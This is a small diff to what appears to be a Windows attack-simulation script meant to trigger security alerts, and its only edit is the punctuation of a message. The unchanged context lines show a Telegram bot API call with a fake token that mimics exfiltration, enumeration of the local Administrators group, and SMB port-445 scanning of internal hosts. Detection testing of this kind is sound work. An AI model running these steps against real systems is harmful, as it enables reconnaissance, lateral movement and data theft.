@@ -60,4 +60,4 @@ try { curl.exe -s "https://api.telegram.org/bot123456:FAKE/sendMessage?chat_id=1
 powershell.exe -Command "Get-LocalGroupMember Administrators" | Out-Null
 1..5 | ForEach-Object { Test-NetConnection -ComputerName "10.148.0.$_" -Port 445 -WarningAction SilentlyContinue | Out-Null }
 
-Write-Host "[*] ===== Windows attack chain complete — check Security -> Alerts ====="
+Write-Host "[*] ===== Windows attack chain complete - check Security -> Alerts ====="
